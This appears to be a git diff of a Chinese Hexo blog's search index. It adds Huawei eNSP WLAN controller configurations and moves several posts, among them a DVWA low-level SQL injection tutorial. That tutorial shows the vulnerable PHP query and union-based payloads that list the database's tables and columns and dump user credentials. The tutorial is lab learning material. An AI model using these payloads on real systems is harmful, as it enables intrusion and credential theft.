.sectionTitle2{fill:#333;}#mermaidChart0 .sectionTitle3{fill:#333;}#mermaidChart0 .sectionTitle{text-anchor:start;font-size:11px;text-height:14px;font-family:’trebuchet ms’,verdana,arial;font-family:var(–mermaid-font-family);}#mermaidChart0 .grid .tick{stroke:lightgrey;opacity:0.8;shape-rendering:crispEdges;}#mermaidChart0 .grid .tick text{font-family:sans-serif;fill:#333;}#mermaidChart0 .grid path{stroke-width:0;}#mermaidChart0 .today{fill:none;stroke:red;stroke-width:2px;}#mermaidChart0 .task{stroke-width:2;}#mermaidChart0 .taskText{text-anchor:middle;font-family:’trebuchet ms’,verdana,arial;font-family:var(–mermaid-font-family);}#mermaidChart0 .taskText:not([font-size]){font-size:11px;}#mermaidChart0 .taskTextOutsideRight{fill:black;text-anchor:start;font-size:11px;font-family:’trebuchet ms’,verdana,arial;font-family:var(–mermaid-font-family);}#mermaidChart0 .taskTextOutsideLeft{fill:black;text-anchor:end;font-size:11px;}#mermaidChart0 .task.clickable{cursor:pointer;}#mermaidChart0 .taskText.clickable{cursor:pointer;fill:#003163 !important;font-weight:bold;}#mermaidChart0 .taskTextOutsideLeft.clickable{cursor:pointer;fill:#003163 !important;font-weight:bold;}#mermaidChart0 .taskTextOutsideRight.clickable{cursor:pointer;fill:#003163 !important;font-weight:bold;}#mermaidChart0 .taskText0,#mermaidChart0 .taskText1,#mermaidChart0 .taskText2,#mermaidChart0 .taskText3{fill:white;}#mermaidChart0 .task0,#mermaidChart0 .task1,#mermaidChart0 .task2,#mermaidChart0 .task3{fill:#8a90dd;stroke:#534fbc;}#mermaidChart0 .taskTextOutside0,#mermaidChart0 .taskTextOutside2{fill:black;}#mermaidChart0 .taskTextOutside1,#mermaidChart0 .taskTextOutside3{fill:black;}#mermaidChart0 .active0,#mermaidChart0 .active1,#mermaidChart0 .active2,#mermaidChart0 .active3{fill:#bfc7ff;stroke:#534fbc;}#mermaidChart0 .activeText0,#mermaidChart0 .activeText1,#mermaidChart0 .activeText2,#mermaidChart0 .activeText3{fill:black !important;}#mermaidChart0 .done0,#mermaidChart0 .done1,#mermaidChart0 .done2,#mermaidChart0 .done3{stroke:grey;fill:lightgrey;stroke-width:2;}#mermaidChart0 .doneText0,#mermaidChart0 .doneText1,#mermaidChart0 .doneText2,#mermaidChart0 .doneText3{fill:black !important;}#mermaidChart0 .crit0,#mermaidChart0 .crit1,#mermaidChart0 .crit2,#mermaidChart0 .crit3{stroke:#ff8888;fill:red;stroke-width:2;}#mermaidChart0 .activeCrit0,#mermaidChart0 .activeCrit1,#mermaidChart0 .activeCrit2,#mermaidChart0 .activeCrit3{stroke:#ff8888;fill:#bfc7ff;stroke-width:2;}#mermaidChart0 .doneCrit0,#mermaidChart0 .doneCrit1,#mermaidChart0 .doneCrit2,#mermaidChart0 .doneCrit3{stroke:#ff8888;fill:lightgrey;stroke-width:2;cursor:pointer;shape-rendering:crispEdges;}#mermaidChart0 .milestone{-webkit-transform:rotate(45deg) scale(0.8,0.8);-ms-transform:rotate(45deg) scale(0.8,0.8);transform:rotate(45deg) scale(0.8,0.8);}#mermaidChart0 .milestoneText{font-style:italic;}#mermaidChart0 .doneCritText0,#mermaidChart0 .doneCritText1,#mermaidChart0 .doneCritText2,#mermaidChart0 .doneCritText3{fill:black !important;}#mermaidChart0 .activeCritText0,#mermaidChart0 .activeCritText1,#mermaidChart0 .activeCritText2,#mermaidChart0 .activeCritText3{fill:black !important;}#mermaidChart0 .titleText{text-anchor:middle;font-size:18px;fill:var(–text-color);font-family:’trebuchet ms’,verdana,arial;font-family:var(–mermaid-font-family);}#mermaidChart0:root{–mermaid-font-family:sans-serif;}#mermaidChart0:root{–mermaid-alt-font-family:sans-serif;}#mermaidChart0 gantt{fill:apa;}</style><g></g><g class="grid" transform="translate(75, 290)" fill="none" font-size="10" font-family="sans-serif" text-anchor="middle"><path class="domain" stroke="currentColor" d="M0.5,-255V0.5H529.5V-255"></path><g class="tick" opacity="1" transform="translate(33.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-07</text></g><g class="tick" opacity="1" transform="translate(99.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-09</text></g><g class="tick" opacity="1" transform="translate(165.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-11</text></g><g class="tick" opacity="1" transform="translate(231.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-13</text></g><g class="tick" opacity="1" transform="translate(298.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-15</text></g><g class="tick" opacity="1" transform="translate(364.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-17</text></g><g class="tick" opacity="1" transform="translate(430.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-19</text></g><g class="tick" opacity="1" transform="translate(496.5,0)"><line stroke="currentColor" y2="-255"></line><text fill="#000" y="3" dy="1em" stroke="none" font-size="10" style="text-anchor: middle;">2014-01-21</text></g></g><g><rect x="0" y="48" width="614" height="24" class="section section0"></rect><rect x="0" y="144" width="614" height="24" class="section section1"></rect><rect x="0" y="72" width="614" height="24" class="section section0"></rect><rect x="0" y="168" width="614" height="24" class="section section1"></rect><rect x="0" y="192" width="614" height="24" class="section section1"></rect><rect x="0" y="96" width="614" height="24" class="section section0"></rect><rect x="0" y="216" width="614" height="24" class="section section1"></rect><rect x="0" y="120" width="614" height="24" class="section section0"></rect><rect x="0" y="240" width="614" height="24" class="section section1"></rect><rect x="0" y="264" width="614" height="24" class="section section1"></rect></g><g><rect id="des1" rx="3" ry="3" x="75" y="50" width="99" height="20" transform-origin="124.5px 60px" class="task done0 "></rect><rect id="task1" rx="3" ry="3" x="75" y="146" width="99" height="20" transform-origin="124.5px 84px" class="task doneCrit1 "></rect><rect id="des2" rx="3" ry="3" x="174" y="74" width="99" height="20" transform-origin="223.5px 108px" class="task active0 "></rect><rect id="task2" rx="3" ry="3" x="174" y="170" width="66" height="20" transform-origin="207px 132px" class="task doneCrit1 "></rect><rect id="task3" rx="3" ry="3" x="240" y="194" width="100" height="20" transform-origin="290px 156px" class="task activeCrit1 "></rect><rect id="des3" rx="3" ry="3" x="273" y="98" width="166" height="20" transform-origin="356px 180px" class="task task0 "></rect><rect id="task4" rx="3" ry="3" x="340" y="218" width="132" height="20" transform-origin="406px 204px" class="task crit1 "></rect><rect id="des4" rx="3" ry="3" x="439" y="122" width="132" height="20" transform-origin="505px 228px" class="task task0 "></rect><rect id="task5" rx="3" ry="3" x="472" y="242" width="66" height="20" transform-origin="505px 252px" class="task task1 "></rect><rect id="task6" rx="3" ry="3" x="538" y="266" width="66" height="20" transform-origin="571px 276px" class="task task1 "></rect><text id="des1-text" font-size="11" x="124.5" y="63.5" text-height="20" class=" taskText taskText0  doneText0 width-21.515625">学习            </text><text id="task1-text" font-size="11" x="124.5" y="159.5" text-height="20" class=" taskText taskText1  doneCritText1 width-57.8125">学习Python </text><text id="des2-text" font-size="11" x="223.5" y="87.5" text-height="20" class=" taskText taskText0 activeText0 width-43.015625">疯狂学习               </text><text id="task2-text" font-size="11" x="207" y="183.5" text-height="20" class=" taskText taskText1  doneCritText1 width-45.03125">学习C++          </text><text id="task3-text" font-size="11" x="290" y="207.5" text-height="20" class=" taskText taskText1 activeCritText1 critText1 width-41">学习Lisp             </text><text id="des3-text" font-size="11" x="356" y="111.5" text-height="20" class=" taskText taskText0  width-64.53125">继续疯狂学习               </text><text id="task4-text" font-size="11" x="406" y="231.5" text-height="20" class=" taskText taskText1  critText1 width-53.78125">学习图形学        </text><text id="des4-text" font-size="11" x="505" y="135.5" text-height="20" class=" taskText taskText0  width-32.265625">吃鸡！               </text><text id="task5-text" font-size="11" x="505" y="255.5" text-height="20" class=" taskText taskText1  width-21.515625">跳伞           </text><text id="task6-text" font-size="11" x="571" y="279.5" text-height="20" class=" taskText taskText1  width-21.515625">打枪                      </text></g><g><text dy="0em" x="10" y="98" class="sectionTitle sectionTitle0"><tspan alignment-baseline="central" x="10">吃一把鸡就学习</tspan></text><text dy="0em" x="10" y="218" class="sectionTitle sectionTitle1"><tspan alignment-baseline="central" x="10">具体内容</tspan></text></g><g class="today"><line x1="100579" x2="100579" y1="25" y2="315" class="today"></line></g><text x="312" y="25" class="titleText">快乐的生活</text></svg></p>
-<h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>您可以使用HTML来设置纯 Markdown 不支持的内容，例如， <code>&lt;span style=&quot;color:red&quot;&gt;this text is red&lt;/span&gt;</code> 用于添加红色文本。</p>
+
+
+
+
+<h3 id="交换机配置"><a href="#交换机配置" class="headerlink" title="交换机配置"></a>交换机配置</h3><pre class="language-none"><code class="language-none">undo terminal monitor 
+sys
+LuRen-SW
+vlan batch 10 100
+int g0&#x2F;0&#x2F;1
+port link-type trunk
+port trunk allow-pass vlan 10 100
+int g0&#x2F;0&#x2F;2
+port link-type trunk
+port trunk pvid vlan 10
+port trunk allow-pass vlan 10 100
+int g0&#x2F;0&#x2F;3
+port link-type trunk
+port trunk pvid vlan 10
+port trunk allow-pass vlan 10 100
+</code></pre>
+
+
+
+<h3 id="AC的配置"><a href="#AC的配置" class="headerlink" title="AC的配置"></a>AC的配置</h3><pre class="language-none"><code class="language-none">sys
+sysname LuRen-AC
+vlan batch 12 10 100
+int g0&#x2F;0&#x2F;1
+port link-type access
+port default vlan 12
+int g0&#x2F;0&#x2F;2
+port link-type trunk
+port trunk allow-pass vlan 10 100
+int vlan 10
+ip add 172.16.1.1 24
+dhcp enable
+int vlan 10
+dhcp select interface
+int vlan 12
+ip add 10.1.1.1 30
+int vlan 100
+ip add 172.16.100.1 24
+dhcp select interface
+quit
+capwap source interface vlan 10
+wlan
+ap whitelist mac 00e0-fcc7-7640
+ap whitelist mac 00e0-fc53-2e60
+security-profile name LuRen	
+security wpa-wpa2 psk pass-phrase 12345678 aes
+
+
+
+
+quit
+ssid-profile name LuRen-ssid
+ssid LuRen
+quit
+regulatory-domain-profile name LuRen-domain
+country-code cn
+quit
+vap-profile name LuRen-vap
+forward-mode tunnel
+service-vlan vlan-id 100
+ssid-profile LuRen-ssid
+
+security-profile LuRen
+
+
+quit
+rrm-profile name LuRen-rrm
+smart-roam enable
+smart-roam roam-threshold check-snr check-rate 
+smart-roam roam-threshold snr 30
+smart-roam roam-threshold rate 30
+quit
+radio-2g-profile name LuRen-2g
+
+
+
+rrm-profile LuRen-rrm
+quit
+radio-5g-profile name LuRen-5g
+rrm-profile LuRen-rrm
+quit
+ap-group name ap
+radio 0
+radio-2g-profile LuRen-2g
+vap-profile LuRen-vap wlan 1
+quit
+radio 1	
+radio-5g-profile LuRen-5g
+
+
+vap-profile LuRen-vap wlan 1
+quit
+quit
+ap-id 0
+ap-group ap
+ap-id 1
+ap-group ap
+</code></pre>
+
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>验证AP上线</p>
+<pre class="language-none"><code class="language-none">[LuRen-AC]dis ap all
+Info: This operation may take a few seconds. Please wait for a moment.done.
+Total AP information:
+nor  : normal          [2]
+-------------------------------------------------------------------------------------------------
+ID   MAC            Name           Group IP           Type            State STA 
+Uptime
+-------------------------------------------------------------------------------------------------
+0    00e0-fc04-7ed0 00e0-fc04-7ed0 ap 172.16.1.133 AP3030DN nor   0 5M:45S
+1    00e0-fc47-3a80 00e0-fc47-3a80 ap 172.16.1.40 AP3030DN  nor   0 5M:36S
+-------------------------------------------------------------------------------------------------
+Total: 2
+</code></pre>
+
+
+
+
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="路由器的配置：-1"><a href="#路由器的配置：-1" class="headerlink" title="路由器的配置："></a>路由器的配置：</h3><pre class="language-none"><code class="language-none">sysname LuRen-R0
+int g0&#x2F;0&#x2F;0
+ip add 10.1.1.2 30
+int lo0
+ip add 1.1.1.1 32
+ospf 1
+area 0.0.0.0
+network 1.1.1.1 0.0.0.0
+network 10.1.1.0 0.0.0.3
+</code></pre>
+
+
+
+<h3 id="交换机配置-1"><a href="#交换机配置-1" class="headerlink" title="交换机配置"></a>交换机配置</h3><pre class="language-none"><code class="language-none">undo terminal monitor 
+sys
+sys LuRen-SW
+vlan batch 10 100
+int g0&#x2F;0&#x2F;1
+port link-type trunk
+port trunk allow-pass vlan 10 100
+int g0&#x2F;0&#x2F;2
+port link-type trunk
+port trunk pvid vlan 10
+port trunk allow-pass vlan 10 100
+int g0&#x2F;0&#x2F;3
+port link-type trunk
+port trunk pvid vlan 10
+port trunk allow-pass vlan 10 100
+</code></pre>
+
+
+
+<h3 id="AC的配置-1"><a href="#AC的配置-1" class="headerlink" title="AC的配置"></a>AC的配置</h3><pre class="language-none"><code class="language-none">sys
+sysname LuRen-AC
+int vlan 1
+ip add 192.168.200.100 24
+quit
+http server enable
+</code></pre>
+
+<h3 id="Web登录"><a href="#Web登录" class="headerlink" title="Web登录"></a>Web登录</h3><pre class="language-none"><code class="language-none">略</code></pre>
 ]]></content>
       <categories>
-        <category>教程</category>
-        <category>博客</category>
+        <category>学习</category>
+        <category>eNSP</category>
+        <category>WLAN和安全</category>
       </categories>
       <tags>
-        <tag>Hexo</tag>
+        <tag>eNSP</tag>
       </tags>
   </entry>
   <entry>
@@ -6194,55 +6362,6 @@ PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source 
       </tags>
   </entry>
   <entry>
-    <title>dvwa--SQL注入(low)</title>
-    <url>/posts/cb7e67e1/</url>
-    <content><![CDATA[<h1 id="dvwa–SQL注入（low）"><a href="#dvwa–SQL注入（low）" class="headerlink" title="dvwa–SQL注入（low）"></a>dvwa–SQL注入（low）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>low级代码分析</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span></code></pre>
-
-<p>未对输入进行过滤，我们输入的内容会传给<code>$id</code>，因此可以考虑在输入上做文章</p>
-<p><strong>我们可以通过以下步骤判断这里是否存在注入点</strong></p>
-<p>① 输入1 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png" alt="1" loading="lazy"></p>
-<p>②输入1’ 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png" alt="2" loading="lazy"></p>
-<p>③输入1 and 1&#x3D;1 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png" alt="3" loading="lazy"></p>
-<p>④输入1 and 1&#x3D;2提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png" alt="4" loading="lazy"></p>
-<p>**猜解 SQL 查询语句中的字段数, **</p>
-<p>①1’ order by 1#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png" alt="5" loading="lazy"></p>
-<p>②1’ order by 2#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png" alt="6" loading="lazy"></p>
-<p>③1’ order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png" alt="7" loading="lazy"></p>
-<p>④确定显示的位置 (SQL 语句查询之后的回显位置)</p>
-<p>1’ union select 1,2# #从下图可以看出有 2 个回显</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png" alt="8" loading="lazy"></p>
-<p><strong>查询当前的数据库, 以及版本</strong></p>
-<p>1’ union select version(),database()#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png" alt="9" loading="lazy"></p>
-<p>获取数据库中的表,</p>
-<p>1’ union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png" alt="10" loading="lazy"></p>
-<p>获取表中的字段名,</p>
-<p>1’union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png" alt="11" loading="lazy"></p>
-<p>获得字段中的数据,</p>
-<p>1’ union select user, password from users#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png" alt="12" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>DVWA</category>
-      </categories>
-      <tags>
-        <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>dvwa--盲注</title>
     <url>/posts/75e4ecec/</url>
     <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
@@ -6489,6 +6608,55 @@ sqlmap -u &quot;192.168.224.135&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#
       </tags>
   </entry>
   <entry>
+    <title>dvwa--SQL注入(low)</title>
+    <url>/posts/cb7e67e1/</url>
+    <content><![CDATA[<h1 id="dvwa–SQL注入（low）"><a href="#dvwa–SQL注入（low）" class="headerlink" title="dvwa–SQL注入（low）"></a>dvwa–SQL注入（low）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>low级代码分析</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span></code></pre>
+
+<p>未对输入进行过滤，我们输入的内容会传给<code>$id</code>，因此可以考虑在输入上做文章</p>
+<p><strong>我们可以通过以下步骤判断这里是否存在注入点</strong></p>
+<p>① 输入1 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png" alt="1" loading="lazy"></p>
+<p>②输入1’ 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png" alt="2" loading="lazy"></p>
+<p>③输入1 and 1&#x3D;1 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png" alt="3" loading="lazy"></p>
+<p>④输入1 and 1&#x3D;2提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png" alt="4" loading="lazy"></p>
+<p>**猜解 SQL 查询语句中的字段数, **</p>
+<p>①1’ order by 1#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png" alt="5" loading="lazy"></p>
+<p>②1’ order by 2#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png" alt="6" loading="lazy"></p>
+<p>③1’ order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png" alt="7" loading="lazy"></p>
+<p>④确定显示的位置 (SQL 语句查询之后的回显位置)</p>
+<p>1’ union select 1,2# #从下图可以看出有 2 个回显</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png" alt="8" loading="lazy"></p>
+<p><strong>查询当前的数据库, 以及版本</strong></p>
+<p>1’ union select version(),database()#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png" alt="9" loading="lazy"></p>
+<p>获取数据库中的表,</p>
+<p>1’ union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png" alt="10" loading="lazy"></p>
+<p>获取表中的字段名,</p>
+<p>1’union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png" alt="11" loading="lazy"></p>
+<p>获得字段中的数据,</p>
+<p>1’ union select user, password from users#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png" alt="12" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>DVWA</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/posts/4a17b156/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -6667,128 +6835,6 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
       </categories>
       <tags>
         <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《天堂旅行团》摘抄</title>
-    <url>/posts/7d0fc3d8/</url>
-    <content><![CDATA[
-    <div id="aplayer-RobPRyVf" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
-    ></div>
-
-
-
-<h2 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h2><p>该书讲述了一个默默无闻的小人物平凡却惊心动魄的人生。几乎要被生活碾压成泥的主人公宋一鲤，意外踏上一场有关生命意义与救赎的治愈之旅。</p>
-<p>宋一鲤的不理想人生，大概要从五岁时，父母婚姻不睦、父亲离家出走算起。刚强的母亲，独自承担起抚养儿子的责任。直至十岁，老家传来父亲病故的噩耗，少年宋一鲤的心里才开始真正地恨上了父亲——那个永远将自己丢在人间的男人。</p>
-<p>随着年龄的增长，宋一鲤像其他普通人一样生活学习，并与大学同学林艺结了婚。可在母亲病倒后，一切都变了。宋一鲤搞不清，这个弯是在哪儿拐的？他与妻子接手了家里的小饭馆，不仅无法照顾母亲，妻子也因不甘心这样生活而提出离婚。宋一鲤一下子被生活打懵了，不知道自己错在哪儿？除了借酒浇愁，做什么都打不起精神。宋一鲤觉得自己没有尽到做儿子、丈夫的责任，没法给母亲、妻子创造更好的生活。</p>
-<p>癌症女孩小聚，就像位天使，降临到了宋一鲤的“人间”。她不仅保护了宋一鲤，还赋予了他重新面对生活的勇气。因为小聚嚷着要去看演唱会，宋一鲤不得不开着他那辆破烂面包车，带着小聚从南京出发，去了武汉，去昆明，再去南昌，一路上遇见了很多人，打了好几场架，管了不少闲事。旅途中，宋一鲤的世界忽然开阔了，不再纠缠于自己在夜里数也数不清的伤痕。他亲眼看见了他人的痛苦与勇敢，看见了他人的责任与担当</p>
-<p>来自：<a href="https://baike.baidu.com/item/%E5%A4%A9%E5%A0%82%E6%97%85%E8%A1%8C%E5%9B%A2/58293831?fr=aladdin">百度百科</a></p>
-<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><blockquote>
-<p>遇见你，就像跋山涉水遇见一轮明月，以后天黑心伤，就问那天借一点月光。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>月亮在远方坠落，浪潮在堤岸破碎，统统不能回到原点。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>月亮永远都在，悬挂于时间长河之中。我从前一天来，要找的人是你。你往后一天去，不是我要找的人了。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>她突然的来，突然的走。我慢慢明白，人与人之间没有突然，她想好了才会来，想清了才会走。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>世界是有尽头的，在南方洋流的末端，冰山漂浮，云和水一起冻结。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>时间治愈不了一切，她只会把泥泞日复一日的堆积。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>我从前一天来，要找的人是你。你往后一天去，不是我要找的人了。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>一个人内心有裂痕的时候，都是静悄悄的，这个世界没人能察觉，只有当他砰的一声碎开，大家才会听到。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>你这个人就是棵荒草，别人稍微爱你一下，就恨不得把心都掏出来。但你是棵荒草啊，能掏出什么来，最多最多，把自己点着了，让人家暖一下手。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>孤独来自于生命中那些重要的人，他们的影子扎根在旧时光，笑容不知道去了何方。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>世界上的一万种苦难，不为谁单独降临，也不为谁网开一面。可我想，窒息之前，总要有一口属于我的空气。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>那些过不去的日子，从天而降，连绵不绝，像一条无穷无尽的隧道。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>没有去过四海，穿过四季，谁也不想困在出生就挣扎的原地。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>一无所有的时候，说明你该拥有的，还没到来。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>命运怎么安排那是它的事，我有我的安排。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>月亮在远方堕落，浪潮在堤岸破碎，统统不能倒回原点。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>他们还可以向前走，水迹会被阳光晒干，种子随风飘往四方，努努力，幸福触手可及。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>愿我余生可以淋漓尽致，即使他们说，消灭痛苦最有效的方式，是降低期待，减少敏感。我依然愿意充满渴求，矢志不渝，并认真感受，无一遗漏。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>天堂没有旅行团，我在世界尽头张望，等你回来，全人类睡得正香。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>生命的终章，我踏上了一段旅途。开着破烂的面包车，穿越几十座城市，撕开雨天，潜入他乡，尽头是天堂。<br>浅蓝的天光，泛紫的云层，路灯嵌进夕阳。山间道路弥漫着一万吨水汽，密林卷来风声，我闯进无止境的夜里。<br>她说，天总会亮的。那么，我们一起记录下，凌晨前的人生。</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>小说</category>
-        <category>摘抄</category>
-      </categories>
-      <tags>
-        <tag>小说摘抄</tag>
       </tags>
   </entry>
   <entry>
@@ -7040,6 +7086,128 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
       <tags>
         <tag>工具</tag>
         <tag>sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《天堂旅行团》摘抄</title>
+    <url>/posts/7d0fc3d8/</url>
+    <content><![CDATA[
+    <div id="aplayer-yEqXzovQ" class="aplayer aplayer-tag-marker meting-tag-marker"
